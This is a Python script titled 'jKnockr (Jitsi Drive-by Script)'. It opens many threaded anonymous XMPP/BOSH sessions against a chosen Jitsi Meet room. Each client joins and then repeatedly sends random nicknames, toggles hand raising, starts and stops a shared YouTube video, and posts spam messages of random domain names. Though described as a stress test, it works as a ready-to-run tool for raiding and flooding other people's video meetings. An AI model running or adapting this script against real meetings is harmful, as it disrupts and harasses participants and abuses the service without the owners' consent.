#!/usr/bin/env python3
# jKnockr (Jitsi Drive-by Script) - Developed by acidvegas in Python (https://git.acid.vegas/jknockr)

import argparse
import http.cookiejar
import random
import socket
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


def client_join(client_id, tlds, args):
    '''Performs the client join process and handles messaging, hand raising, nickname changes, and video sharing.'''
    try:
        print(f'Client {client_id}: Starting')

        # Create a cookie jar and an opener with HTTPCookieProcessor
        cookie_jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

        headers = {
            'Content-Type': 'text/xml; charset=utf-8'
        }

        # Generate a large random number for the initial 'rid'
        rid = random.randint(1000000, 9999999)

        # Generate an initial random nickname of 50 characters (letters and numbers)
        nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=50))

        # Extract domain and room name from the target URL
        parsed_url = urllib.parse.urlparse(args.target)
        target_domain = parsed_url.hostname
        room_name = parsed_url.path.strip('/')

        if not room_name:
            print(f'Client {client_id}: No room name specified in the target URL.')
            return

        bosh_url = f'https://{target_domain}/http-bind'

        # Step 1: Establish a session
        print(f'Client {client_id}: Establishing session')
        body = f'''<body rid='{rid}' to='{target_domain}' xml:lang='en' wait='60' hold='1' xmlns='http://jabber.org/protocol/httpbind'/>'''
        request = urllib.request.Request(bosh_url, data=body.encode('utf-8'), headers=headers, method='POST')
        response = opener.open(request, timeout=10)
        response_text = response.read().decode('utf-8')
        sid = extract_sid(response_text)
        if not sid:
            print(f'Client {client_id}: Failed to obtain session ID.')
            print(f'Client {client_id}: Server response: {response_text}')
            return
        print(f'Client {client_id}: Obtained session ID: {sid}')

        # Increment rid
        rid += 1

        # Step 2: Send authentication request
        print(f'Client {client_id}: Sending authentication request')
        auth_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
          <auth mechanism='ANONYMOUS' xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/>
        </body>'''
        request = urllib.request.Request(bosh_url, data=auth_body.encode('utf-8'), headers=headers, method='POST')
        response = opener.open(request, timeout=10)
        response_text = response.read().decode('utf-8')
        if '<success' in response_text:
            print(f'Client {client_id}: Authentication successful.')
        else:
            print(f'Client {client_id}: Authentication failed.')
            print(f'Client {client_id}: Server response: {response_text}')
            return

        # Increment rid
        rid += 1

        # Step 3: Restart the stream
        print(f'Client {client_id}: Restarting stream')
        restart_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind' to='{target_domain}' xml:lang='en' xmpp:restart='true' xmlns:xmpp='urn:xmpp:xbosh'/>'''
        request = urllib.request.Request(bosh_url, data=restart_body.encode('utf-8'), headers=headers, method='POST')
        response = opener.open(request, timeout=10)
        response_text = response.read().decode('utf-8')

        # Increment rid
        rid += 1

        # Step 4: Bind resource
        print(f'Client {client_id}: Binding resource')
        bind_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
          <iq type='set' id='bind_1' xmlns='jabber:client'>
            <bind xmlns='urn:ietf:params:xml:ns:xmpp-bind'/>
          </iq>
        </body>'''
        request = urllib.request.Request(bosh_url, data=bind_body.encode('utf-8'), headers=headers, method='POST')
        response = opener.open(request, timeout=10)
        response_text = response.read().decode('utf-8')
        jid = extract_jid(response_text)
        if not jid:
            print(f'Client {client_id}: Failed to bind resource.')
            print(f'Client {client_id}: Server response: {response_text}')
            return
        print(f'Client {client_id}: Bound resource. JID: {jid}')

        # Increment rid
        rid += 1

        # Step 5: Send initial presence to join the room without hand raised
        print(f'Client {client_id}: Sending initial presence')
        presence_elements = [
            '<x xmlns=\'http://jabber.org/protocol/muc\'/>',
            f'<nick xmlns=\'http://jabber.org/protocol/nick\'>{nickname}</nick>'
        ]

        # Build the presence stanza
        presence_stanza = ''.join(presence_elements)
        room_jid = f'{room_name}@conference.{target_domain}/{nickname}'
        presence_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
            <presence to='{room_jid}' xmlns='jabber:client'>
              {presence_stanza}
            </presence>
          </body>'''
        request = urllib.request.Request(bosh_url, data=presence_body.encode('utf-8'), headers=headers, method='POST')
        response = opener.open(request, timeout=10)
        response_text = response.read().decode('utf-8')
        print(f'Client {client_id}: Server response to initial presence (join room):')
        print(response_text)

        # Increment rid
        rid += 1

        # Step 6: Send messages with hand raise/lower, nickname change, and video sharing
        hand_raised = True  # Start with hand raised if enabled

        for i in range(1, 101):  # Adjust number of iterations/messages per client as needed
            print(f'Client {client_id}: Starting iteration {i}')

            # Generate a new random nickname if nickname change is enabled
            if args.nick:
                nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=50))

            presence_elements = []
            presence_elements.append(f'<nick xmlns=\'http://jabber.org/protocol/nick\'>{nickname}</nick>')

            # Handle hand raise/lower
            if args.hand:
                timestamp = int(time.time() * 1000)
                if hand_raised:
                    presence_elements.append(f'<jitsi_participant_raisedHand>{timestamp}</jitsi_participant_raisedHand>')
                # Toggle hand raised status for next iteration
                hand_raised = not hand_raised

            # Handle video sharing
            if args.youtube:
                # Example YouTube video ID (you can randomize or set this as needed)
                video_id = '21lma6hU3mk'
                # Alternate video state between 'start' and 'stop'
                video_state = 'start' if i % 2 == 1 else 'stop'
                presence_elements.append(f'<shared-video from=\'{jid}\' state=\'{video_state}\' time=\'0\'>{video_id}</shared-video>')

            # Build and send the presence update if any of the presence-related features are enabled
            if args.nick or args.hand or args.youtube:
                presence_stanza = ''.join(presence_elements)
                room_jid = f'{room_name}@conference.{target_domain}/{nickname}'
                presence_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
                    <presence to='{room_jid}' xmlns='jabber:client'>
                      {presence_stanza}
                    </presence>
                  </body>'''
                request = urllib.request.Request(bosh_url, data=presence_body.encode('utf-8'), headers=headers, method='POST')
                response = opener.open(request, timeout=10)
                response_text = response.read().decode('utf-8')
                print(f'Client {client_id}: Server response to presence update:')
                print(response_text)
                # Increment rid
                rid += 1

            # Send message if messaging is enabled
            if args.message:
                # Build the message content
                try:
                    if not tlds:
                        print(f'Client {client_id}: TLD list is empty. Using default TLDs.')
                        tlds = ['com', 'net', 'org', 'info', 'io']
                    msg = ' '.join(f'{random_word(5)}.{random.choice(tlds)}' for _ in range(5))
                except IndexError as e:
                    print(f'Client {client_id}: Error generating message: {e}')
                    msg = 'defaultmessage.com'
                message_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
                    <message to='{room_name}@conference.{target_domain}' type='groupchat' xmlns='jabber:client'>
                        <body>{msg}</body>
                    </message>
                  </body>'''
                request = urllib.request.Request(bosh_url, data=message_body.encode('utf-8'), headers=headers, method='POST')
                response = opener.open(request, timeout=10)
                response_text = response.read().decode('utf-8')
                print(f'Client {client_id}: Server response to message {i}:')
                print(response_text)
                # Increment rid
                rid += 1

        print(f'Client {client_id}: Finished')

    except Exception as e:
        print(f'Client {client_id}: Exception occurred: {e}')


def extract_jid(response_text):
    '''Extracts the JID from the XML response.'''
    try:
        root = ET.fromstring(response_text)
        for elem in root.iter():
            if 'jid' in elem.tag:
                return elem.text
        return None
    except ET.ParseError:
        return None


def extract_sid(response_text):
    '''Extracts the SID from the XML response.'''
    try:
        root = ET.fromstring(response_text)
        return root.attrib.get('sid')
    except ET.ParseError:
        return None


def force_ipv4():
    '''Forces the use of IPv4 by monkey-patching socket.getaddrinfo.'''
    # Save the original socket.getaddrinfo
    socket._original_getaddrinfo = socket.getaddrinfo

    # Define a new getaddrinfo function that filters out IPv6
    def getaddrinfo_ipv4_only(host, port, family=0, type=0, proto=0, flags=0):
        return socket._original_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)

    # Override socket.getaddrinfo
    socket.getaddrinfo = getaddrinfo_ipv4_only


def main():
    '''Main function to start threads and execute the stress test.'''
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Stress test a Jitsi Meet server.')
    parser.add_argument('target', help='Target room URL (e.g., https://meet.jit.si/roomname)')
    parser.add_argument('--message', action='store_true', help='Enable messaging')
    parser.add_argument('--hand', action='store_true', help='Enable hand raising')
    parser.add_argument('--nick', action='store_true', help='Enable nickname changes')
    parser.add_argument('--youtube', action='store_true', help='Enable video sharing')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads (clients) to use')
    args = parser.parse_args()

    # Fetch the list of TLDs
    print('Fetching TLDs')
    try:
        tlds_url = 'https://data.iana.org/TLD/tlds-alpha-by-domain.txt'
        request = urllib.request.Request(tlds_url)
        with urllib.request.urlopen(request, timeout=10) as response:
            response_text = response.read().decode('utf-8')
            tlds = [line.lower() for line in response_text.splitlines() if not line.startswith('#')]
            print(f'Number of TLDs fetched: {len(tlds)}')
            if not tlds:
                print('TLD list is empty after fetching. Using default TLDs.')
                tlds = ['com', 'net', 'org', 'info', 'io']
    except Exception as e:
        print(f'Failed to fetch TLDs: {e}')
        print('Using default TLDs.')
        tlds = ['com', 'net', 'org', 'info', 'io']

    threads = []

    for i in range(args.threads):
        t = threading.Thread(target=client_join, args=(i, tlds, args))
        threads.append(t)
        t.start()

    # Optionally, join threads if you want the main thread to wait
    for t in threads:
        t.join()


def random_word(length):
    '''Generates a random word of a given length.'''
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))


if __name__ == '__main__':
    force_ipv4()
    main()
